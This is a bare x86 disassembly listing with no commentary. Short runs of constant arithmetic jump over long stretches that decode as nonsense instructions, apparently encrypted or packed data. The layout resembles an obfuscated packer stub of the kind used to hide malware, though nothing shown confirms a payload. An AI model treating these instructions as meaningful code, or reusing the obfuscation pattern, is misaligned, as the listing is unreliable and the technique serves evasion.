  40a77a:	xor    edx,edx
  40a77c:	mov    DWORD PTR [ebp-0x10],0x429
  40a783:	mov    eax,DWORD PTR [ebp-0x28]
  40a786:	mov    ecx,DWORD PTR [ebp-0x24]
  40a789:	sub    eax,0x175c
  40a78e:	div    ecx
  40a790:	mov    ecx,DWORD PTR [ebp-0x20]
  40a793:	xor    edx,edx
  40a795:	mov    edi,0x4db5
  40a79a:	div    ecx
  40a79c:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a79f:	xor    edx,edx
  40a7a1:	div    ecx
  40a7a3:	xor    edx,edx
  40a7a5:	mov    ecx,eax
  40a7a7:	mov    eax,DWORD PTR [ebp+0x8]
  40a7aa:	imul   ecx,ecx,0x2e01
  40a7b0:	mov    esi,DWORD PTR [ebp-0x4]
  40a7b3:	add    eax,edi
  40a7b5:	div    esi
  40a7b7:	mov    edx,DWORD PTR [ebp-0x8]
  40a7ba:	mov    esi,0x940a7
  40a7bf:	sub    ecx,0x16bea86
  40a7c5:	jmp    0x40aa5c
  40a7ca:	lds    ecx,FWORD PTR [ebp+0x709870ff]
  40a7d0:	mov    dh,0xb7
  40a7d2:	and    dh,BYTE PTR [esi+ecx*1]
  40a7d5:	sahf   
  40a7d6:	jg     0x40a78a
  40a7d8:	mov    ebp,0xbe9ffecf
  40a7dd:	mov    esi,0xbebec2a9
  40a7e2:	or     eax,0x79c3c8a9
  40a7e7:	adc    BYTE PTR [esi],bh
  40a7e9:	pop    esp
  40a7ea:	icebp  
  40a7eb:	pop    ebx
  40a7ec:	jg     0x40a7da
  40a7ee:	pop    esi
  40a7ef:	bound  ebx,QWORD PTR [ebp+0x28f1d453]
  40a7f5:	in     al,dx
  40a7f6:	add    DWORD PTR [ebx+0x1a],ebp
  40a7f9:	mov    ch,0xaf
  40a7fb:	jb     0x40a81e
  40a7fd:	clc    
  40a7fe:	and    dl,BYTE PTR [ecx]
  40a800:	ins    BYTE PTR es:[edi],dx
  40a801:	mov    WORD PTR [ecx+0x58],cs
  40a804:	xor    al,0x6d
  40a806:	int    0x4
  40a808:	fdiv   DWORD PTR [edx+0x22c9f6db]
  40a80e:	cmp    al,0x11
  40a810:	clc    
  40a811:	repz inc ecx
  40a813:	xchg   ebx,eax
  40a814:	jp     0x40a891
  40a816:	xchg   esp,eax
  40a817:	mov    WORD PTR [ecx],cs
  40a819:	sub    eax,0x55964ba0
  40a81e:	stos   BYTE PTR es:[edi],al
  40a81f:	(bad)  
  40a820:	call   0x98311274
  40a825:	out    dx,al
  40a826:	sub    BYTE PTR [edx-0x44],bh
  40a829:	sub    bh,bh
  40a82b:	popa   
  40a82c:	push   ecx
  40a82d:	(bad)  ds:0x22c4ba55
  40a833:	(bad)  
  40a834:	mov    al,ds:0xa640935
  40a839:	mov    ch,0x9f
  40a83b:	std    
  40a83c:	loop   0x40a810
  40a83e:	jl     0x40a89d
  40a840:	adc    bl,BYTE PTR [eax]
  40a842:	inc    edi
  40a843:	outs   dx,DWORD PTR ds:[esi]
  40a844:	fwait
  40a845:	(bad)  
  40a846:	cdq    
  40a847:	clc    
  40a848:	mov    al,ds:0x113e206f
  40a84d:	and    eax,0xba4da1df
  40a852:	sub    al,0xff
  40a854:	mov    cs,esi
  40a856:	cmc    
  40a857:	add    al,0x53
  40a859:	jecxz  0x40a875
  40a85b:	adc    edx,DWORD PTR [edi]
  40a85d:	and    al,0x7d
  40a85f:	loope  0x40a855
  40a861:	addr16 mov esp,0x14fdc136
  40a867:	clc    
  40a868:	fstp   DWORD PTR [edx+ecx*4+0x32]
  40a86c:	jge    0x40a8d9
  40a86e:	adc    eax,0x651898c7
  40a873:	or     eax,0x4bd8d175
  40a878:	push   ss
  40a879:	loopne 0x40a8bd
  40a87b:	icebp  
  40a87c:	push   esp
  40a87d:	dec    ebx
  40a87e:	repnz add bl,BYTE PTR [edx+0x71d30d27]
  40a885:	dec    ecx
  40a886:	inc    eax
  40a887:	add    ebx,eax
  40a889:	aaa    
  40a88a:	push   ds
  40a88b:	jp     0x40a80e
  40a88d:	mov    esi,0xe0890949
  40a892:	jno    0x40a866
  40a894:	rcr    ecx,1
  40a896:	push   esi
  40a897:	xor    esp,ebx
  40a899:	dec    ebp
  40a89a:	sbb    ebp,DWORD PTR [esi]
  40a89c:	fisubr DWORD PTR [edx+edx*4]
  40a89f:	das    
  40a8a0:	daa    
  40a8a1:	(bad)
  40a8a5:	or     esp,DWORD PTR [edx+0x549eb1ff]
  40a8ab:	cdq    
  40a8ac:	push   edx
  40a8ad:	je     0x40a843
  40a8af:	ficom  DWORD PTR [ecx+0x43ecf635]
  40a8b5:	xor    al,0x1
  40a8b7:	xchg   esi,eax
  40a8b8:	jmp    0xdd156003
  40a8bd:	test   DWORD PTR ds:0xb1950f32,0x1f067d66
  40a8c7:	pop    ebp
  40a8c8:	faddp  st(6),st
  40a8ca:	xchg   cl,ch
  40a8cc:	mov    edx,0xbdb07ed1
  40a8d1:	retf   0xbff9
  40a8d4:	inc    edi
  40a8d5:	add    al,0x96
  40a8d7:	js     0x40a92c
  40a8d9:	shl    BYTE PTR [ecx],1
  40a8db:	inc    edi
  40a8dc:	pusha  
  40a8dd:	or     eax,0x1eb7db0a
  40a8e2:	aaa    
  40a8e3:	(bad)  
  40a8e4:	dec    ecx
  40a8e5:	xor    BYTE PTR [ecx],dl
  40a8e7:	sub    DWORD PTR [edx+0x24],edi
  40a8ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8eb:	sub    esi,ebx
  40a8ed:	in     al,dx
  40a8ee:	add    ah,BYTE PTR [eax+0x2f]
  40a8f1:	inc    esp
  40a8f2:	sub    bl,BYTE PTR [ebx+0x5b]
  40a8f5:	sbb    esp,DWORD PTR [ecx+0x2b]
  40a8f8:	mov    dl,0xd9
  40a8fa:	sbb    DWORD PTR [edi],edi
  40a8fc:	mov    ebx,0xee07cda6
  40a901:	ins    BYTE PTR es:[edi],dx
  40a902:	or     eax,0x691f4dfe
  40a907:	pop    eax
  40a908:	aam    0xb2
  40a90a:	add    dh,cl
  40a90c:	mov    DWORD PTR [ecx+0xb],edx
  40a90f:	add    dh,BYTE PTR [ebx+0xf]
  40a912:	xor    BYTE PTR [ebx+eax*8-0x1c],0x9c
  40a917:	fidiv  DWORD PTR [esi+eiz*2-0x42]
  40a91b:	mov    edx,0x1b77ca26
  40a920:	adc    BYTE PTR [ecx],ch
  40a922:	inc    edx
  40a923:	(bad)  
  40a925:	into   
  40a926:	jno    0x40a926
  40a928:	lock lods eax,DWORD PTR ds:[si]
  40a92b:	xor    ah,BYTE PTR [eax+ebx*8]
  40a92e:	jmp    0x507e:0x5b9de942
  40a935:	test   BYTE PTR [ecx],dl
  40a937:	fnstenv [ebp+0x6f]
  40a93a:	aas    
  40a93b:	ins    DWORD PTR es:[edi],dx
  40a93c:	dec    esp
  40a93d:	xchg   edx,eax
  40a93e:	enter  0xd01f,0x93
  40a942:	sti    
  40a943:	add    esp,ecx
  40a945:	repz sbb DWORD PTR [esi],ebx
  40a948:	retf   
  40a949:	pop    esi
  40a94a:	xor    eax,ecx
  40a94c:	mov    ds:0x54b88ac8,eax
  40a951:	cmp    DWORD PTR [edx],edx
  40a953:	mov    ds:0xf68f808d,al
  40a958:	in     al,dx
  40a959:	rol    al,1
  40a95b:	push   es
  40a95c:	and    DWORD PTR [ebx+0x55],ecx
  40a95f:	and    al,0x2f
  40a961:	xor    bh,BYTE PTR [eax+0x5ad43c7f]
  40a967:	mov    ebx,0x304f9ed0
  40a96c:	push   edx
  40a96d:	push   esp
  40a96e:	and    ah,dh
  40a970:	adc    al,0x3d
  40a972:	div    cl
  40a974:	pop    eax
  40a975:	mov    cl,0xfe
  40a977:	xchg   ebx,eax
  40a978:	ins    BYTE PTR es:[edi],dx
  40a979:	inc    esi
  40a97a:	shl    BYTE PTR [edi+0xd],0x6
  40a97e:	leave  
  40a97f:	stc    
  40a980:	fs inc ebx
  40a982:	push   cs
  40a983:	sbb    eax,0xbc0f7e74
  40a988:	inc    edi
  40a989:	cmp    al,0xb3
  40a98b:	sub    BYTE PTR [eax],dh
  40a98d:	enter  0x3d8b,0xbe
  40a991:	xor    DWORD PTR [esi-0x24e6daac],ecx
  40a997:	int    0x47
  40a999:	xchg   ecx,eax
  40a99a:	sbb    al,0x43
  40a99c:	in     al,dx
  40a99d:	int3   
  40a99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a99f:	pop    ds
  40a9a0:	xor    BYTE PTR [edx],al
  40a9a2:	pop    eax
  40a9a3:	mov    ebp,0xf1903c73
  40a9a8:	sbb    al,BYTE PTR gs:[ebx]
  40a9ab:	sub    dh,BYTE PTR [edi]
  40a9ad:	mov    dl,0xe3
  40a9af:	add    al,BYTE PTR [edx+0x7b]
  40a9b2:	repz and ebp,esi
  40a9b5:	push   esi
  40a9b6:	hlt    
  40a9b7:	push   es
  40a9b8:	loopne 0x40aa0d
  40a9ba:	iret   
  40a9bb:	pop    ds
  40a9bc:	sbb    BYTE PTR [edx],dh
  40a9be:	mov    ebx,0x6bc9022e
  40a9c3:	iret   
  40a9c4:	(bad)  
  40a9c5:	not    DWORD PTR [ecx]
  40a9c7:	iret   
  40a9c8:	(bad)  [eax]
  40a9ca:	sub    esp,DWORD PTR [edi+edi*2+0x37e9ef49]
  40a9d1:	mov    ebx,0xf444de88
  40a9d6:	ins    DWORD PTR es:[edi],dx
  40a9d7:	stos   BYTE PTR es:[edi],al
  40a9d8:	mov    edx,0x7679ba3d
  40a9dd:	and    BYTE PTR [edi+0x5ff71462],ch
  40a9e3:	or     bh,dl
  40a9e5:	lods   eax,DWORD PTR ds:[esi]
  40a9e6:	arpl   WORD PTR [esi],dx
  40a9e8:	pop    eax
  40a9e9:	xor    ah,BYTE PTR [edi+ecx*2+0x213f401d]
  40a9f0:	scas   eax,DWORD PTR es:[edi]
  40a9f1:	mov    al,ch
  40a9f3:	mov    BYTE PTR [ebx-0x75bbf2e5],dh
  40a9f9:	pop    edi
  40a9fa:	cmp    eax,0x2a7a4fc8
  40a9ff:	xchg   esp,eax
  40aa00:	cmp    dh,BYTE PTR [ebx]
  40aa02:	sbb    al,0xb9
  40aa04:	in     eax,0x16
  40aa06:	imul   esp,DWORD PTR [edx],0x67152499
  40aa0c:	sub    BYTE PTR [edx+esi*8+0x15649704],dl
  40aa13:	jg     0x40aa51
  40aa15:	lods   eax,DWORD PTR ds:[esi]
  40aa16:	test   BYTE PTR [eax],al
  40aa18:	fcos   
  40aa1a:	ret    0x28a8
  40aa1d:	arpl   WORD PTR [esi],dx
  40aa1f:	mov    ds:0x60fdceea,al
  40aa24:	xchg   ecx,edi
  40aa26:	and    dl,ah
  40aa28:	mov    ebp,0xd5d3446a
  40aa2d:	(bad)  
  40aa2f:	mov    al,ds:0xfd2ba6a5
  40aa34:	xchg   ebp,eax
  40aa35:	in     al,dx
  40aa36:	sub    BYTE PTR [ecx-0x3],bh
  40aa39:	adc    BYTE PTR [ebx+0x58b1a5b0],0x64
  40aa40:	clc    
  40aa41:	fld    TBYTE PTR ds:0x21e7ebaf
  40aa47:	cmp    eax,0x329c1453
  40aa4c:	jle    0x40aa24
  40aa4e:	out    0x55,eax
  40aa50:	pop    es
  40aa51:	sub    bh,BYTE PTR [edi+0x5ec36a42]
  40aa57:	inc    ebp
  40aa58:	jnp    0x40a9f6
  40aa5a:	ja     0x40aa7e
  40aa5c:	sub    eax,edx
  40aa5e:	xor    edx,edx
  40aa60:	div    esi
  40aa62:	mov    esi,0xdbd
  40aa67:	add    eax,esi
  40aa69:	cmp    ecx,eax
  40aa6b:	jae    0x40b05a
  40aa71:	mov    DWORD PTR [ebp-0x1c],0x2d7e
  40aa78:	mov    DWORD PTR [ebp-0x20],0x383e
  40aa7f:	mov    DWORD PTR [ebp-0x24],0x3a3a
  40aa86:	mov    DWORD PTR [ebp-0x14],0x13cd
  40aa8d:	jmp    0x40ad24
  40aa92:	popa   
  40aa93:	clc    
  40aa94:	jnp    0x40aae9
  40aa96:	jl     0x40aaec
  40aa98:	imul   edi,eax,0x9e64741c
  40aa9e:	shl    eax,1
  40aaa0:	pop    eax
  40aaa1:	shr    edx,1
  40aaa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaa4:	mov    esi,0xbec2a9be
  40aaa9:	mov    esi,0xd91db0c5
  40aaae:	sub    DWORD PTR [eax+0x325cb6d5],edi
  40aab4:	nop
  40aab5:	jae    0x40aadd
  40aab7:	out    0x15,eax
  40aab9:	cli    
  40aaba:	xor    esi,ecx
  40aabc:	fidivr WORD PTR [esi-0x5b]
  40aabf:	xor    BYTE PTR gs:[edx-0xe2e3e04],ch
  40aac6:	(bad)  
  40aac7:	in     al,0x22
  40aac9:	(bad)  
  40aaca:	loope  0x40aaad
  40aacc:	push   0xffffffdb
  40aace:	adc    eax,0x6f0e6e35
  40aad3:	nop
  40aad4:	leave  
  40aad5:	and    al,0x6e
  40aad7:	retf   
  40aad8:	push   ebx
  40aad9:	cs mov esp,0xf7ea59b4
  40aadf:	mov    eax,0x79c3f07d
  40aae4:	popf   
  40aae5:	push   cs
  40aae6:	dec    edx
  40aae7:	and    edi,0x33cab169
  40aaed:	cwde   
  40aaee:	ins    BYTE PTR es:[edi],dx
  40aaef:	pop    edi
  40aaf0:	div    BYTE PTR ds:0x60d42f33
  40aaf6:	jg     0x40ab4f
  40aaf8:	mov    eax,es:0x7ecfb7a3
  40aafe:	movq   QWORD PTR [edx+0x47],mm5
  40ab02:	xchg   edi,eax
  40ab03:	sqrtps xmm3,XMMWORD PTR ds:0x9a562a31
  40ab0a:	jecxz  0x40aa8e
  40ab0c:	push   0xabe1ce03
  40ab11:	add    ch,BYTE PTR [edi-0x5386e7a9]
  40ab17:	popw   es
  40ab19:	pop    edx
  40ab1a:	push   edi
  40ab1b:	into   
  40ab1c:	fadd   DWORD PTR [ebx-0x20]
  40ab1f:	pop    edx
  40ab20:	out    0x1b,eax
  40ab22:	cwde   
  40ab23:	and    esp,DWORD PTR [eax+0x6d]
  40ab26:	and    DWORD PTR [eax+0x16],esp
  40ab29:	shl    DWORD PTR [esi-0x67],0xc5
  40ab2d:	leave  
  40ab2e:	sbb    BYTE PTR [ebp+0x79],cl
  40ab31:	pop    ebx
  40ab32:	xchg   ecx,eax
  40ab33:	loopne 0x40ab10
  40ab35:	mov    ebx,DWORD PTR [edx-0x4e]
  40ab38:	je     0x40ab41
  40ab3a:	mov    ecx,DWORD PTR [edi]
  40ab3c:	enter  0x6ad8,0x7c
  40ab40:	mov    DWORD PTR [esi+0x4903f5e2],ebp
  40ab46:	xchg   esp,eax
  40ab47:	sub    al,0xaa
  40ab49:	gs xchg ebx,eax
  40ab4b:	ror    BYTE PTR [ebx],1
  40ab4d:	inc    esi
  40ab4e:	(bad)
  40ab52:	imul   esp,DWORD PTR [eax+0xe],0x1aee88e9
  40ab59:	inc    edi
  40ab5a:	std    
  40ab5b:	retf   0x9e40
  40ab5e:	leave  
  40ab5f:	or     DWORD PTR [eax-0x80],ecx
  40ab62:	jnp    0x40ab1c
  40ab64:	jmp    0xc33a1d2b
  40ab69:	mov    ecx,0xef96285c
  40ab6e:	out    dx,eax
  40ab6f:	push   edi
  40ab70:	arpl   WORD PTR [esi-0x69],bx
  40ab73:	ret    0x230d
  40ab76:	ds int 0xbe
  40ab79:	loop   0x40ab1d
  40ab7b:	push   eax
  40ab7c:	stos   BYTE PTR es:[edi],al
  40ab7d:	cmp    edi,ebp
  40ab7f:	adc    al,0x9d
  40ab81:	and    DWORD PTR [edi],ebx
  40ab83:	adc    esi,ebp
  40ab85:	mov    al,ds:0x6b64f9e0
  40ab8a:	xchg   edi,eax
  40ab8b:	mov    ah,BYTE PTR [edi+0x1085ea7d]
  40ab91:	sbb    eax,0x58
  40ab94:	aaa    
  40ab95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab96:	(bad)  
  40ab97:	loopne 0x40ac05
  40ab99:	pop    esp
  40ab9a:	out    0xd1,al
  40ab9c:	lahf   
  40ab9d:	mov    ebx,DWORD PTR [ebp-0x2e2fe1c0]
  40aba3:	cmp    ebx,DWORD PTR [edi]
  40aba5:	xchg   ebx,eax
  40aba6:	cld    
  40aba7:	sbb    eax,DWORD PTR [ebx+0x6bbef1f]
  40abad:	lea    edx,[esi+0x1083723f]
  40abb3:	mov    dl,0x4d
  40abb5:	mov    BYTE PTR [edi+0x2a],cl
  40abb8:	adc    DWORD PTR [esi],ebp
  40abba:	pop    esp
  40abbb:	dec    ecx
  40abbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abbd:	xor    bl,ah
  40abbf:	pop    esp
  40abc0:	in     eax,0xcc
  40abc2:	dec    ebp
  40abc3:	ret    0xd020
  40abc6:	mov    al,0x4a
  40abc8:	jecxz  0x40ab70
  40abca:	retf   0x8df1
  40abcd:	mov    edx,ecx
  40abcf:	inc    eax
  40abd0:	and    al,BYTE PTR ds:0xbdac685e
  40abd6:	shr    DWORD PTR [ebp+eiz*8-0xa],0xd0
  40abdb:	cmp    al,BYTE PTR [eax+ebx*1]
  40abde:	xor    BYTE PTR [eax],bl
  40abe0:	cdq    
  40abe1:	xor    bl,dh
  40abe3:	dec    edx
  40abe4:	sbb    esi,DWORD PTR [esp+esi*8+0x67]
  40abe8:	lock pop esp
  40abea:	push   es
  40abeb:	(bad)  
  40abed:	stos   DWORD PTR es:[edi],eax
  40abee:	shr    BYTE PTR [edi],0xd
  40abf1:	fild   QWORD PTR [ecx]
  40abf3:	and    ah,BYTE PTR [eax+0x5c]
  40abf6:	imul   edi,DWORD PTR [ecx+0x317e0d48],0xffffffe8
  40abfd:	add    esi,ebp
  40abff:	int3   
  40ac00:	and    al,0x29
  40ac02:	xchg   ecx,eax
  40ac03:	adc    al,0x19
  40ac05:	call   esi
  40ac07:	mov    ebp,0x65b0c6ba
  40ac0c:	adc    DWORD PTR [eax],esi
  40ac0e:	or     BYTE PTR [esi],0xce
  40ac11:	lahf   
  40ac12:	lahf   
  40ac13:	jmp    0x23168aa8
  40ac18:	mov    esi,0x82b3ee98
  40ac1d:	xor    edi,DWORD PTR [ebp-0x27a592d7]
  40ac23:	mov    eax,0xdb745d88
  40ac28:	jnp    0x40ac2e
  40ac2a:	dec    esi
  40ac2b:	xchg   ebx,edx
  40ac2d:	ret    0xd582
  40ac30:	ret    
  40ac31:	shl    DWORD PTR [edi+0x3c],cl
  40ac34:	or     bh,BYTE PTR [eax+0x7d]
  40ac37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac38:	bound  ecx,QWORD PTR [ebp-0x51]
  40ac3b:	sbb    eax,esp
  40ac3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac3e:	imul   edx,DWORD PTR [ebp+0x5f],0xb97c5d0e
  40ac45:	dec    ebx
  40ac46:	pop    ecx
  40ac47:	sti    
  40ac48:	loopne 0x40ac96
  40ac4a:	out    dx,eax
  40ac4b:	pop    ecx
  40ac4c:	imul   edi,DWORD PTR [ebx-0x7e],0x8a7b97e4
  40ac53:	in     al,0xea
  40ac55:	xor    DWORD PTR [esi],ebp
  40ac57:	mov    cl,0x6f
  40ac59:	and    eax,0x3063e78d
  40ac5e:	push   es
  40ac5f:	sti    
  40ac60:	mov    al,0xf1
  40ac62:	cmp    al,BYTE PTR [eax+eiz*2-0x57]
  40ac66:	lds    ebx,FWORD PTR [ecx+0x69]
  40ac69:	cld    
  40ac6a:	or     al,0x42
  40ac6c:	aad    0x50
  40ac6e:	xchg   ecx,eax
  40ac6f:	mov    edx,0x2d0364d7
  40ac74:	lods   eax,DWORD PTR ds:[esi]
  40ac75:	dec    edi
  40ac76:	add    dl,bl
  40ac78:	(bad)  
  40ac79:	pop    esi
  40ac7a:	mov    cl,0x97
  40ac7c:	test   eax,0x34f873c2
  40ac81:	mov    ebx,DWORD PTR [edx+0x388c6036]
  40ac87:	outs   dx,DWORD PTR ds:[esi]
  40ac88:	push   esi
  40ac89:	dec    ebp
  40ac8a:	in     al,0x2e
  40ac8c:	fisttp WORD PTR [ebx+0xa]
  40ac8f:	xor    BYTE PTR [ebx+ebp*4],bh
  40ac92:	mov    ds:0xc302a79a,eax
  40ac97:	push   edx
  40ac98:	clc    
  40ac99:	mov    dl,0x38
  40ac9b:	mov    bl,BYTE PTR [esi+esi*8+0xa19c833]
  40aca2:	xchg   ebx,eax
  40aca3:	fwait
  40aca4:	and    al,0xce
  40aca6:	loopne 0x40ad1c
  40aca8:	cmp    DWORD PTR [ecx-0x24],esp
  40acab:	mov    edx,0xfbadf269
  40acb0:	cmp    al,dh
  40acb2:	sub    eax,0xec0f681d
  40acb7:	pop    ebp
  40acb8:	sub    dh,BYTE PTR [esi-0x47]
  40acbb:	or     BYTE PTR [eax+0xd],dh
  40acbe:	ret    
  40acbf:	sub    BYTE PTR [esi],bh
  40acc1:	push   eax
  40acc2:	or     DWORD PTR [ebp-0x1fec78e1],esp
  40acc8:	adc    eax,0x8b91233a
  40accd:	dec    eax
  40acce:	mov    ds:0xc524cb43,eax
  40acd3:	mov    ds:0x2ff3ad88,al
  40acd8:	inc    edx
  40acd9:	std    
  40acda:	mov    dl,0x91
  40acdc:	arpl   bx,si
  40acde:	imul   ebp,DWORD PTR [edi-0x75af6861],0xb8132ed0
  40ace8:	into   
  40ace9:	mov    ebx,0x4b9e963f
  40acee:	xchg   ecx,eax
  40acef:	xchg   edi,eax
  40acf0:	out    dx,eax
  40acf1:	dec    eax
  40acf2:	dec    eax
  40acf3:	aaa    
  40acf4:	jecxz  0x40ad4c
  40acf6:	push   ss
  40acf7:	xor    dl,ch
  40acf9:	sub    al,0xbb
  40acfb:	mov    edi,0x76b493e5
  40ad00:	mov    bh,0x8d
  40ad02:	sbb    ecx,ebx
  40ad04:	mov    esi,0xca3c0ae8
  40ad09:	sbb    al,0x28
  40ad0b:	(bad)  
  40ad0c:	in     eax,dx
  40ad0d:	int3   
  40ad0e:	fs in  al,0xbc
  40ad11:	es add al,0x9d
  40ad14:	dec    edi
  40ad15:	pop    DWORD PTR [edx-0x62]
  40ad18:	fstp   DWORD PTR [ebx+edi*1]
  40ad1b:	add    cl,ah
  40ad1d:	adc    al,BYTE PTR [eax]
  40ad1f:	xchg   esp,eax
  40ad20:	enter  0xe025,0x4
  40ad24:	xor    edx,edx
  40ad26:	mov    DWORD PTR [ebp-0x18],0x187
  40ad2d:	mov    DWORD PTR [ebp-0x28],0x3224
  40ad34:	mov    eax,DWORD PTR [ebp-0x28]
  40ad37:	push   0x6
  40ad39:	pop    ebx
  40ad3a:	div    ebx
  40ad3c:	mov    edx,eax
  40ad3e:	mov    eax,ds:0x422708
  40ad43:	mov    eax,DWORD PTR [eax+0x1d0]
  40ad49:	sub    eax,edx
  40ad4b:	mov    edx,DWORD PTR [ebp-0x24]
  40ad4e:	jmp    0x40afe5
  40ad53:	dec    esp
  40ad54:	sub    BYTE PTR [ebp-0x49],ah
  40ad57:	test   eax,0xb93c9cb8
  40ad5c:	and    BYTE PTR [esi+0x6e1de690],bl
  40ad62:	fst    st(5)
  40ad64:	test   eax,0xc2a9bebe
  40ad69:	mov    esi,0x897bb6be
  40ad6e:	mov    dh,BYTE PTR [edx]
  40ad70:	fwait
  40ad71:	dec    esp
  40ad72:	push   edi
  40ad73:	fdiv   st,st(2)
  40ad75:	cmp    ebp,DWORD PTR [edi+ebx*2+0x75960bac]
  40ad7c:	mov    al,ds:0x4fc8387f
  40ad81:	sbb    BYTE PTR [ecx],al
  40ad83:	mov    ch,0x2f
  40ad85:	cld    
  40ad86:	sub    DWORD PTR [ecx+ebx*4+0xd3d39b2],0xa986a99a
  40ad91:	sbb    al,0x8b
  40ad93:	adc    eax,0xe847ad77
  40ad98:	mov    cs,ebx
  40ad9a:	or     dh,BYTE PTR [ebx+0x33]
  40ad9d:	xor    esp,DWORD PTR [esp+edx*4-0x6c]
  40ada1:	sbb    ebx,DWORD PTR [eax]
  40ada3:	or     eax,0x18aca196
  40ada8:	cs cs jecxz 0x40ae24
  40adac:	adc    dh,BYTE PTR ds:0x756cf130
  40adb2:	pop    esi
  40adb3:	int    0x24
  40adb5:	(bad)  
  40adb6:	fisttp WORD PTR [edi+0x7a]
  40adb9:	shl    BYTE PTR [esi-0x2a],1
  40adbc:	aad    0x4e
  40adbe:	gs mov edx,0x1f36f19
  40adc4:	test   DWORD PTR [ebp-0x87ea7a8],eax
  40adca:	call   0xaa5b:0x7f79b506
  40add1:	shl    cl,0xbd
  40add4:	mov    esp,0xaa9245ad
  40add9:	out    dx,eax
  40adda:	mov    eax,ds:0x5536a6fb
  40addf:	jae    0x40ae13
  40ade1:	adc    eax,0xf6ea487b
  40ade6:	mov    ds:0xfbbcf1c9,al
  40adeb:	add    DWORD PTR [ebx-0x7],ecx
  40adee:	add    bh,bl
  40adf0:	jg     0x40adb1
  40adf2:	daa    
  40adf3:	or     edx,edi
  40adf5:	inc    esp
  40adf6:	sub    al,BYTE PTR [edx-0x15]
  40adf9:	pop    edx
  40adfa:	jne    0x40ad89
  40adfc:	jle    0x40adea
  40adfe:	mov    ebx,0x784a1194
  40ae03:	js     0x40adf5
  40ae05:	or     eax,0xe321cb58
  40ae0a:	imul   ebx,DWORD PTR [ebx],0xfffffffd
  40ae0d:	scas   eax,DWORD PTR es:[edi]
  40ae0e:	cmp    al,0x3e
  40ae10:	adc    al,0x40
  40ae12:	mov    esi,DWORD PTR [ebx+ebx*4-0x32938036]
  40ae19:	fimul  DWORD PTR [esi-0x56]
  40ae1c:	vpaddq ymm0,ymm6,ymm0
  40ae21:	int3   
  40ae22:	jecxz  0x40ae86
  40ae24:	mov    esi,0xca62dc7a
  40ae29:	loopne 0x40ae43
  40ae2b:	mov    al,0xfd
  40ae2d:	mov    ds:0x62cba9b2,al
  40ae32:	retf   0x25d7
  40ae35:	inc    esp
  40ae36:	sbb    ah,ch
  40ae38:	add    BYTE PTR [edi+edi*1-0x45],dl
  40ae3c:	fisttp DWORD PTR fs:[eax]
  40ae40:	or     eax,DWORD PTR [ebp+0x19]
  40ae43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae44:	push   edi
  40ae45:	enter  0x9a5d,0x61
  40ae49:	push   cs
  40ae4a:	sbb    eax,DWORD PTR [edi+ebp*1-0x492bfdfa]
  40ae51:	xor    BYTE PTR [ecx-0x71],cl
  40ae54:	xchg   esp,eax
  40ae55:	inc    ebx
  40ae56:	mov    gs,ecx
  40ae58:	fwait
  40ae59:	in     eax,dx
  40ae5a:	cmc    
  40ae5b:	mov    eax,ds:0x1a3366b3
  40ae60:	ins    DWORD PTR es:[edi],dx
  40ae61:	iret   
  40ae62:	push   cs
  40ae63:	mov    cl,0x96
  40ae65:	adc    edi,DWORD PTR [ebp+0x76]
  40ae68:	jnp    0x40aee2
  40ae6a:	mov    bl,BYTE PTR [ebx-0x38]
  40ae6d:	or     al,0xd4
  40ae6f:	adc    bh,BYTE PTR [ebx]
  40ae71:	cmp    edx,ebp
  40ae73:	inc    DWORD PTR [esi+ebp*4+0x723d11c0]
  40ae7a:	test   eax,0x5736a94
  40ae7f:	mov    cl,0xeb
  40ae81:	loope  0x40aeee
  40ae83:	fnstcw WORD PTR [eax]
  40ae85:	inc    esp
  40ae86:	inc    eax
  40ae87:	adc    ah,bh
  40ae89:	sahf   
  40ae8a:	in     eax,dx
  40ae8b:	pop    esi
  40ae8c:	lods   eax,DWORD PTR ds:[esi]
  40ae8d:	bound  esp,QWORD PTR [edx+0x60]
  40ae90:	mov    al,0xde
  40ae92:	out    0x70,eax
  40ae94:	inc    eax
  40ae95:	adc    cl,0x3f
  40ae98:	iret   
  40ae99:	repnz rol BYTE PTR [edi-0x2a],1
  40ae9d:	ss xchg esi,eax
  40ae9f:	into   
  40aea0:	add    ecx,esi
  40aea2:	xchg   edi,eax
  40aea3:	loopne 0x40ae99
  40aea5:	push   ebp
  40aea6:	std    
  40aea7:	fucomi st,st(2)
  40aea9:	cmp    edx,eax
  40aeab:	xchg   ebx,eax
  40aeac:	(bad)  
  40aead:	jnp    0x40ae6a
  40aeaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb0:	mov    ebp,0xe63d5950
  40aeb5:	sti    
  40aeb6:	fsub   st,st(2)
  40aeb8:	fsub   DWORD PTR [ebp-0x383b89eb]
  40aebe:	aam    0x0
  40aec0:	jae    0x40aeaf
  40aec2:	iret   
  40aec3:	adc    dl,bl
  40aec5:	cmp    DWORD PTR [esi-0x33b65d81],0xffffffaa
  40aecc:	sub    BYTE PTR [esi+0xb],0xe3
  40aed0:	sub    al,0x82
  40aed2:	inc    esi
  40aed3:	ins    BYTE PTR es:[edi],dx
  40aed4:	sub    dl,BYTE PTR [esi-0x16]
  40aed7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aed8:	pop    eax
  40aed9:	jno    0x40af29
  40aedb:	dec    edx
  40aedc:	cmp    ch,ah
  40aede:	scas   al,BYTE PTR es:[edi]
  40aedf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aee0:	out    0xe8,eax
  40aee2:	repz mov bl,0xb5
  40aee5:	and    ebx,ebp
  40aee7:	(bad)  
  40aee8:	lock call 0x3be7fae0
  40aeee:	sbb    dh,ch
  40aef0:	and    ch,BYTE PTR [esi+0x3e36e031]
  40aef6:	or     dl,bl
  40aef8:	test   al,0x4e
  40aefa:	popa   
  40aefb:	dec    ebx
  40aefc:	dec    esi
  40aefd:	retf   0xd208
  40af00:	in     eax,0xe4
  40af02:	sub    al,bl
  40af04:	mov    ch,0xe6
  40af06:	add    DWORD PTR [ebx+ebp*1],edx
